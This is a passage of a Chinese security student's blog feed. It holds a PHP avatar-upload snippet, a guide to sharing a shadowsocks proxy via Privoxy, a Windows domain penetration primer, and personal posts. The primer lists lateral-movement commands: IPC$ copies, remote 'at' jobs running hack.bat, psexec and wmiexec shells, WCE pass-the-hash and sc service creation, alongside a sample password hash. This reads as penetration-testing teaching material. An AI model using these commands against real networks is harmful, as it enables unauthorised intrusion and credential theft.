class="keyword">else</span> &#123;</div><div class="line">            <span class="comment">//对图片进行保存</span></div><div class="line">            $pattern=<span class="string">'1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ'</span>;</div><div class="line">            <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">10</span>; $i++)</div><div class="line">            &#123;</div><div class="line">                $key .= $pattern&#123;mt_rand(<span class="number">0</span>,<span class="number">35</span>)&#125;;    <span class="comment">//生成php随机数</span></div><div class="line">            &#125;</div><div class="line">            $newFileName = sha1(date(<span class="string">'Y-m-d'</span>,time()).$key).<span class="string">'.'</span>.$extensionName;</div><div class="line">            $savePath    = $path.$newFileName;  <span class="comment">//图片的存储路径</span></div><div class="line">            $showPath    = <span class="string">'/Public/UserPicture/'</span>.$newFileName;</div><div class="line">            move_uploaded_file($_FILES[<span class="string">'Filedata'</span>][<span class="string">'tmp_name'</span>], $savePath);</div><div class="line">            <span class="keyword">if</span>(!file_exists($savePath))&#123;</div><div class="line">                $resultCode = <span class="number">3</span>;</div><div class="line">                $resultMsg  = <span class="string">'上传失败'</span>;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="comment">//将图片路径添加到用户数据表中</span></div><div class="line">                $resultMsg  = <span class="string">'上传成功'</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $resultCode = <span class="number">5</span>;</div><div class="line">        $resultMsg  = <span class="string">'文件未上传'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(</div><div class="line">        <span class="string">'codeNum'</span> =&gt; $resultCode,</div><div class="line">        <span class="string">'msg'</span>     =&gt; $resultMsg,</div><div class="line">        <span class="string">'path'</span>    =&gt; $showPath,</div><div class="line">    ));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>codeNum那块儿，没做细化的处理。如有需求，自己修改一下就好了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近一直抽时间写小组的宣传网站，用的thinkphp框架，找了个前端模板。本来想动手写thinkphp练练手，没想到…&lt;/p&gt;
&lt;p&gt;因为前端都不行，就随便找了个模板，自己拼拼凑凑。头像上传的功能，模板里没有，因为自己太渣，只能在网上找现成的，尝试了几个插件，最终用ajaxfileupload实现了需求。&lt;/p&gt;
&lt;p&gt;这里记录一下今天上午踩得坑吧。看的那篇文章，好多坑，坑死了…&lt;/p&gt;
    
    </summary>
    
      <category term="网站开发" scheme="http://blog.izilong.net/categories/%E7%BD%91%E7%AB%99%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="ajax" scheme="http://blog.izilong.net/tags/ajax/"/>
    
      <category term="php" scheme="http://blog.izilong.net/tags/php/"/>
    
      <category term="异步上传" scheme="http://blog.izilong.net/tags/%E5%BC%82%E6%AD%A5%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>shadowsocks共享 for mac</title>
    <link href="http://blog.izilong.net/2017/02/03/shadowsocks%E5%85%B1%E4%BA%AB-for-mac/"/>
    <id>http://blog.izilong.net/2017/02/03/shadowsocks共享-for-mac/</id>
    <published>2017-02-03T06:43:09.000Z</published>
    <updated>2017-02-04T08:09:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>Mac上用ShadowsocksX来翻墙，记得kali虚拟机之前也装了shadowsocks，解决翻墙的问题。前几天学弟想在kali里面去翻墙。记得Windows里面的shadowsocks，直接勾选“允许来自局域网的连接”皆可以共享了。Mac的ShadowsocksX没有这个功能。经过Google，找到一种解决方案，记录一下。<br><a id="more"></a></p>
<h2 id="安装Privoxy"><a href="#安装Privoxy" class="headerlink" title="安装Privoxy"></a>安装Privoxy</h2><pre><code>brew install privoxy  //利用brew安装
</code></pre><p>或从 <a href="http://www.privoxy.org/" target="_blank" rel="external">官网</a>下载，安装</p>
<h2 id="修改Privoxy的配置信息"><a href="#修改Privoxy的配置信息" class="headerlink" title="修改Privoxy的配置信息"></a>修改Privoxy的配置信息</h2><pre><code>vim /usr/local/etc/privoxy/config
</code></pre><ol>
<li><p>修改<code>forward-socks5t  /</code></p>
<p>删掉注释符，修改为：<code>forward-socks5t   /               127.0.0.1:1080 .</code></p>
<p>注意结尾有”.”，这里的1080为本机shadowsocks的本地端口。</p>
</li>
<li><p>修改<code>listen-address</code></p>
<p> 删掉注释符，修改为<code>listen-address  0.0.0.0:8118</code></p>
<p> 这里的8118为Privoxy的本地监听端口。</p>
</li>
</ol>
<h2 id="启动Privoxy"><a href="#启动Privoxy" class="headerlink" title="启动Privoxy"></a>启动Privoxy</h2><pre><code>privoxy --no-daemon /usr/local/etc/privoxy/config
</code></pre><p>显示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">2017-02-03 15:04:15.037 7fffaec1b Info: Privoxy version 3.0.26</div><div class="line">2017-02-03 15:04:15.038 7fffaec1b Info: Program name: privoxy</div></pre></td></tr></table></figure>
<p>运行起来。</p>
<h2 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h2><p>在局域网内其他主机上，代理设置为Mac的IP，端口为之前设置的8118，即可使用Mac上的shadowsocks代理。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Mac上用ShadowsocksX来翻墙，记得kali虚拟机之前也装了shadowsocks，解决翻墙的问题。前几天学弟想在kali里面去翻墙。记得Windows里面的shadowsocks，直接勾选“允许来自局域网的连接”皆可以共享了。Mac的ShadowsocksX没有这个功能。经过Google，找到一种解决方案，记录一下。&lt;br&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://blog.izilong.net/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="流量转发" scheme="http://blog.izilong.net/tags/%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/"/>
    
      <category term="shadowsocks" scheme="http://blog.izilong.net/tags/shadowsocks/"/>
    
  </entry>
  
  <entry>
    <title>域渗透基础基础知识(1)</title>
    <link href="http://blog.izilong.net/2017/01/24/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86-1/"/>
    <id>http://blog.izilong.net/2017/01/24/域渗透基础知识整理-1/</id>
    <published>2017-01-24T04:07:41.000Z</published>
    <updated>2017-02-22T02:07:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前写过一篇内网当中域渗透的简单文章。好久没遇到忘得差不多了。前几天做项目，正好碰到了域环境，正好有时间，再回顾一下原来的知识，另外把新补充的知识再记录一下。</p>
<h2 id="域相关知识"><a href="#域相关知识" class="headerlink" title="域相关知识"></a>域相关知识</h2><h3 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h3><p>域英文叫DOMAIN——域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。<br><a id="more"></a><br>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其他域的安全信任关系。<br>如果企业网络中计算机和用户数量较多时，要实现高效管理，就需要windows域。</p>
<h3 id="域相关概念"><a href="#域相关概念" class="headerlink" title="域相关概念"></a>域相关概念</h3><p><strong>活动目录</strong>是由组织单元、域（domain）、域树（tree）、森林（forest）构成的层次结构。<strong>域</strong>作为最基本的管理单元，同时也是最基层的容器，它可以对员工、计算机等基本数据进行存储。在一个活动目录中可以根据需要建立多个域，比方说“甲公司”的财务科、人事科、销售科就可以各建一个域，因为这几个域同属甲公司，所以就可以将这几个域构成一棵<strong>域树</strong>并交给域树管理，这棵域树就是甲公司。又因为，甲公司、乙公司、丙公司都归属A集团，那么为了让A集团可以更好地管理这三家子公司，就可以将这三家公司的域树集中起来组成<strong>域森林</strong>（即A集团）。因此A集团可以按“子公司（域树）→部门→员工”的方式进行层次分明的管理。活动目录这种层次结构使企业网络具有极强的扩展性，便于组织、管理以及目录定位。</p>
<h3 id="域的搭建过程"><a href="#域的搭建过程" class="headerlink" title="域的搭建过程"></a>域的搭建过程</h3><ol>
<li><p>域控制器安装（win server系统） </p>
<p>先安装一个DNS——安装active directory（注：装这两个都需要系统光盘或镜像；安装active directory时相关的信息选择和命令要按自己的需求来）<br>装好后开始——管理工具，打开active directory用户和计算机——新建用户（密码选永不过期）——在域中设置委派控制（对象为前面建的用户）——完成域控制器就建好了 </p>
</li>
<li><p>电脑加入域 </p>
<p>设置成与域控制器在同一个网段，然后右击“我的电脑”——属性——计算机名——更改——选“域”然后输入你建的域的域名重启就行了（注：这台电脑的计算机名要先在添加到域控制器中去）</p>
</li>
</ol>
<p>参考：</p>
<blockquote>
<p>AD域环境的搭建 基于Server 2008 R2: <a href="http://www.it165.net/os/html/201306/5493.html" target="_blank" rel="external">http://www.it165.net/os/html/201306/5493.html</a></p>
<p>Acitve Directory 域环境的搭建: <a href="http://blog.sina.com.cn/s/blog_6ce0f2c901014okt.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_6ce0f2c901014okt.html</a></p>
</blockquote>
<h2 id="什么是ipc-连接"><a href="#什么是ipc-连接" class="headerlink" title="什么是ipc$连接"></a>什么是ipc$连接</h2><h3 id="ipc-概念"><a href="#ipc-概念" class="headerlink" title="ipc$概念"></a>ipc$概念</h3><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。</p>
<h3 id="ipc-的作用"><a href="#ipc-的作用" class="headerlink" title="ipc$的作用"></a>ipc$的作用</h3><p>利用IPC$,连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。 </p>
<h3 id="ipc-的利用条件"><a href="#ipc-的利用条件" class="headerlink" title="ipc$的利用条件"></a>ipc$的利用条件</h3><ol>
<li><p>139，445端口开启。</p>
<p>ipc$连接可以实现远程登陆及对默认共享的访问;而139端口的开启表示netbios协议的应用,我们可以通过139,445(win2000)端口实现对共享文件/打印机的访问,因此一般来讲,ipc$连接是需要139或445端口来支持的. </p>
</li>
<li><p>管理员开启了默认共享。</p>
<p>默认共享是为了方便管理员远程管理而默认开启的共享,即所有的逻辑盘(c$,d$,e$……)和系统目录winnt或windows(admin$),我们通过ipc$连接可以实现对这些默认共享的访问。</p>
</li>
</ol>
<h3 id="ipc连接失败的原因"><a href="#ipc连接失败的原因" class="headerlink" title="ipc连接失败的原因"></a>ipc连接失败的原因</h3><ol>
<li>你的系统不是NT或以上操作系统.</li>
<li>对方没有打开ipc$默认共享。</li>
<li>不能成功连接目标的139，445端口.</li>
<li>命令输入错误.</li>
<li>用户名或密码错误. </li>
</ol>
<h3 id="常见错误号："><a href="#常见错误号：" class="headerlink" title="常见错误号："></a>常见错误号：</h3><ol>
<li>错误号5，拒绝访问 ： 很可能你使用的用户不是管理员权限的，先提升权限； </li>
<li>错误号51，Windows 无法找到网络路径 : 网络有问题； </li>
<li>错误号53，找不到网络路径 ： ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； </li>
<li>错误号67，找不到网络名 ： 你的lanmanworkstation服务未启动；目标删除了ipc$； 错误号1219，提供的凭据与已存在的凭据集冲突 ： 你已经和对方建立了一个ipc$，请删除再连。 </li>
<li>错误号1326，未知的用户名或错误密码 ： 原因很明显了； </li>
<li>错误号1792，试图登录，但是网络登录服务没有启动 ： 目标NetLogon服务未启动。（连接域控会出现此情况） </li>
<li>错误号2242，此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。</li>
</ol>
<h2 id="域内的文件操作"><a href="#域内的文件操作" class="headerlink" title="域内的文件操作"></a>域内的文件操作</h2><h3 id="利用IPC"><a href="#利用IPC" class="headerlink" title="利用IPC$"></a>利用IPC$</h3><p>建立ipc连接以后，就可以访问目标机器的文件（上传、下载），也可以在目标机器上运行命令。</p>
<p>上传和下载文件直接通过copy命令就可以，不过路径换成UNC路径。</p>
<p>何为UNC路径？简单来讲以\开头的路径就是UNC路径，比如\192.168.1.2\c$\boot.ini。</p>
<p>如果要从本地当前目录上传1.bat到192.168.1.2机器C盘根目录下，那么命令就是<br><code>copy 1.bat \\192.168.1.2\C$\</code></p>
<p>反之就是下载。dir、copy、xcopy、move、type的参数都可以使用UNC路径。</p>
<h3 id="利用Telnet"><a href="#利用Telnet" class="headerlink" title="利用Telnet"></a>利用Telnet</h3><p>服务端：<code>nc -lvp 23 &lt; nc.exe</code></p>
<p>下载端：<code>telnet ip -f c:\nc.exe</code></p>
<h3 id="利用文件共享"><a href="#利用文件共享" class="headerlink" title="利用文件共享"></a>利用文件共享</h3><p>映射目标<br><code>net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]</code></p>
<h2 id="域内运行命令"><a href="#域内运行命令" class="headerlink" title="域内运行命令"></a>域内运行命令</h2><h3 id="利用计划任务"><a href="#利用计划任务" class="headerlink" title="利用计划任务"></a>利用计划任务</h3><p><code>at \\192.168.200.100 15:00 c:\hack.bat</code></p>
<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>psexec针对远程建立连接的认证方式有两种，一种先建立ipc连接，然后直接用psexec \192.168.200.100 cmd命令开启一个半交互式的cmdshell，另一种是在psexec的参数中指定账号密码。<br>参数：</p>
<blockquote>
<p>-s 参数用来以system权限执行</p>
<p>–accepteula 绕过第一次运行的弹窗</p>
<p>-c &lt;[路径]文件名&gt;:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）</p>
<p>-d 不等待程序执行完就返回</p>
</blockquote>
<p><code>psexec \\192.168.1.2 c:\hack.bat</code></p>
<h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><p>T00ls大牛写的一款工具。早就传开了。<br>半交互模式：<br><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password</code></p>
<p>单个命令执行的模式：<br><code>cscript.exe  wmiexec.vbs /cmd 192.168.1.1 username password  &quot;command&quot;</code></p>
<p>如果有时候我们抓取到的是hash，破解不了时可以利用WCE的hash注入，然后再执行WMIEXEC（不提供账号密码）就可以了。</p>
<pre><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1  
wce -s [hash] 
cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1
</code></pre><h3 id="SC创建服务执行"><a href="#SC创建服务执行" class="headerlink" title="SC创建服务执行"></a>SC创建服务执行</h3><pre><code>1、系统权限(其中test为服务名)
sc \\DC1 create test binpath= c:\cmd.exe
sc \\DC1 start test
sc \\DC1 delete test

2.指定用户权限启动
sc \\DC1 create test binpath = &quot;c:\1.exe&quot; obj= &quot;centoso\administrator&quot; passwrod= test
sc \\DC1 start test
</code></pre><h2 id="hash相关知识"><a href="#hash相关知识" class="headerlink" title="hash相关知识"></a>hash相关知识</h2><p>windows的密码是经过hash后存储的，本地存在sam，system注册表中，域里面存在ntds.dit中。密码hash有两种格式，LM hash和NT hash。</p>
<p>| 2000 | xp | 2003 | Vista | win7 | 2008 | 2012 | </p>
<p>前面三个默认是LM hash,当密码超过14位时候会采用NTLM加密 </p>
<p><code>test:1003:E52CAC67419A9A22664345140A852F61:67A54E1C9058FCA16498061B96863248:::</code></p>
<p>前一部分是LM Hash，后一部分是NTLM Hash 当LM Hash是<code>AAD3B435B51404EEAAD3B435B51404EE</code> 这表示空密码或者是未使用LM_HASH</p>
<p>LMhash可以用在线网站秒破： <a href="http://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="external">http://www.objectif-securite.ch/en/ophcrack.php</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前写过一篇内网当中域渗透的简单文章。好久没遇到忘得差不多了。前几天做项目，正好碰到了域环境，正好有时间，再回顾一下原来的知识，另外把新补充的知识再记录一下。&lt;/p&gt;
&lt;h2 id=&quot;域相关知识&quot;&gt;&lt;a href=&quot;#域相关知识&quot; class=&quot;headerlink&quot; title=&quot;域相关知识&quot;&gt;&lt;/a&gt;域相关知识&lt;/h2&gt;&lt;h3 id=&quot;什么是域&quot;&gt;&lt;a href=&quot;#什么是域&quot; class=&quot;headerlink&quot; title=&quot;什么是域&quot;&gt;&lt;/a&gt;什么是域&lt;/h3&gt;&lt;p&gt;域英文叫DOMAIN——域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。&lt;br&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://blog.izilong.net/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="域渗透" scheme="http://blog.izilong.net/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>2016总结</title>
    <link href="http://blog.izilong.net/2017/01/21/2016%E6%80%BB%E7%BB%93/"/>
    <id>http://blog.izilong.net/2017/01/21/2016总结/</id>
    <published>2017-01-21T12:46:39.000Z</published>
    <updated>2017-01-21T13:36:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>想写一下2016的总结，想了半天，不知道该从哪里写起，2016发生了太多太多。一点一点写吧。</p>
<h1 id="实习"><a href="#实习" class="headerlink" title="实习"></a>实习</h1><p>2016年春节过完之后，初八，到青岛一家安全公司实习，绝大多数时间在自学，算是把Linux基本的用法和知识掌握了个差不多，也跟公司的师傅学了很多猥琐的姿势。</p>
<p>平时上课没事也会到公司过周六周天，老大和师傅们是真的强，对我也是真的好。学到了很多东西，也意识到人外有人天外有天。<br><a id="more"></a><br>寒假放假之后，白天学NA，晚上住公司，跟师傅学姿势。用docker做了次比赛，现在正在运行，用了七八个docker，搭建了七八个靶场。</p>
<h1 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h1><ol>
<li>七八月份 上海 第九届全国大学生信息安全技能大赛 三等奖</li>
<li>九月份 济南 蓝盾杯网络空间安全竞赛（山东赛区） 特等奖</li>
<li>十月份 西安 XDCTF 二等奖</li>
<li>十一月份 青岛 山东省大学生网络安全技能大赛 团体二等奖、个人二等奖</li>
<li>十二月份 广州 蓝盾杯网络空间安全竞赛（全国总决赛）一等奖</li>
</ol>
<p>憋屈了大半个大学，这学期终于有能拿的出手的奖了。虽然拿了些奖，但其中运气、巧合的因素有很多，被大佬带飞，躺赢的时候也有。比赛的技术难度也不高。还是得继续加油~</p>
<h1 id="带人"><a href="#带人" class="headerlink" title="带人"></a>带人</h1><p>最有成就感的事就是带了一批搞安全的学弟出来，当然，最重要的因素还是小伙子们自身的努力。</p>
<p>短短几个月的时间，成长的不慢。各个比赛也能拿奖了，也可以做项目了。有些比赛还被学弟压在下面，逃….</p>
<p>继续加油吧，希望这种势头能够一代代传承下去。 人多了才能搞事情嘛~</p>
<h1 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h1><p>跟师傅们驻场和线上，做了几次项目。真的是感谢各位师傅给的机会。</p>
<ol>
<li>杭州某驻场项目 跟牛们学到很多姿势，知道了渗透测试报告该怎么写，内网该怎么漫游。</li>
<li>线上某公司项目 F老板给了7个Web系统测，分工给了学弟，没拿到什么成果。可以说是一团糟= =、 也不算坏事，及时发现问题，及时总结改正，希望下次能圆满的完成任务。</li>
<li>青岛某驻场项目 按计划只有几个小时的时间，能拿到点东西就算完成任务。非常幸运的是控了整个内网。圆满完成。</li>
<li>比赛环境搭建 公司项目，用docker在公网上做了套靶场。边查边做，巩固了一下docker的相关知识。也从得到了一丝灵感，争取2017年能够做出东西。</li>
<li>本该去，但因为学校课程原因没去成的项目。。。GG，希望以后还能有机会。</li>
</ol>
<h1 id="Love"><a href="#Love" class="headerlink" title="Love"></a>Love</h1><p>忍不住笑了。。。。最重要的事当然留到最后说。</p>
<p>2016最重要的事情，碰到了对的人，还很幸运的走到了一起。（狗粮吃的可爽？）</p>
<p>不管怎么样，以后会一起走下去。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;想写一下2016的总结，想了半天，不知道该从哪里写起，2016发生了太多太多。一点一点写吧。&lt;/p&gt;
&lt;h1 id=&quot;实习&quot;&gt;&lt;a href=&quot;#实习&quot; class=&quot;headerlink&quot; title=&quot;实习&quot;&gt;&lt;/a&gt;实习&lt;/h1&gt;&lt;p&gt;2016年春节过完之后，初八，到青岛一家安全公司实习，绝大多数时间在自学，算是把Linux基本的用法和知识掌握了个差不多，也跟公司的师傅学了很多猥琐的姿势。&lt;/p&gt;
&lt;p&gt;平时上课没事也会到公司过周六周天，老大和师傅们是真的强，对我也是真的好。学到了很多东西，也意识到人外有人天外有天。&lt;br&gt;
    
    </summary>
    
      <category term="Others" scheme="http://blog.izilong.net/categories/Others/"/>
    
    
  </entry>
  
  <entry>
    <title>博客搬迁</title>
    <link href="http://blog.izilong.net/2017/01/21/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/"/>
    <id>http://blog.izilong.net/2017/01/21/博客搬迁/</id>
    <published>2017-01-21T12:32:21.000Z</published>
    <updated>2017-01-21T13:40:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo-Github-Coding"><a href="#Hexo-Github-Coding" class="headerlink" title="Hexo+Github+Coding"></a>Hexo+Github+Coding</h1><p>之前用WordPress，觉得太臃肿，换到了Typecho，比较简洁，也用的是NEXT的主题，感觉好不错。服务器也从阿里云的虚拟主机搬到了日本的Conhon的VPS上，挂了百度云加速的CDN。</p>
<p>有个域名没备案，临时把网站挂在了VPS上，特喵的居然被学弟D了，结果主机商也太坑爹了，检测到被D，直接封禁账户，不能重建新的VPS，数据搬迁花了我一天的时间。换到了DigitalOcean的新加坡节点。因为各种各样的原因吧，一直没怎么写博客。（主要原因还是自己太渣，觉得没什么可以写的= =、 ）<br><a id="more"></a><br>放假这几天想把博客重新利用起来，及时简单的东西也要写，温故而知新。也能给后来人一定的帮助。一直想找个比较优雅的方案，发现了Hexo+Github，简直爽爆了，不用担心各种各样被搞的问题，markdown写起来也是真的爽，最主要的还是数据丢失的可能性不大。</p>
<p>因为上台笔记本SSD掉盘的问题，损失了不少数据，真的是烦躁，当然也怕自己记得东西会丢，之前都是放在有道云笔记，有网页剪报也比较方便，但看到为知笔记最近。。。不知道什么时候有道云也会GG。换了Mac，博客也改头换面，换个优雅的吧！</p>
<p>以后会发些自己可能会忘，但是很重要的东西，也会陆续把之前的写的文章搬过来。学了这么多，得积淀下东西不是。</p>
<p>虽然有的东西可能很菜，但是我就是很菜啊，就这样。</p>
<p>继续加油咯~</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Hexo-Github-Coding&quot;&gt;&lt;a href=&quot;#Hexo-Github-Coding&quot; class=&quot;headerlink&quot; title=&quot;Hexo+Github+Coding&quot;&gt;&lt;/a&gt;Hexo+Github+Coding&lt;/h1&gt;&lt;p&gt;之前用WordPress，觉得太臃肿，换到了Typecho，比较简洁，也用的是NEXT的主题，感觉好不错。服务器也从阿里云的虚拟主机搬到了日本的Conhon的VPS上，挂了百度云加速的CDN。&lt;/p&gt;
&lt;p&gt;有个域名没备案，临时把网站挂在了VPS上，特喵的居然被学弟D了，结果主机商也太坑爹了，检测到被D，直接封禁账户，不能重建新的VPS，数据搬迁花了我一天的时间。换到了DigitalOcean的新加坡节点。因为各种各样的原因吧，一直没怎么写博客。（主要原因还是自己太渣，觉得没什么可以写的= =、 ）&lt;br&gt;
    
    </summary>
    
      <category term="Others" scheme="http://blog.izilong.net/categories/Others/"/>
    
    
  </entry>
  
</feed>
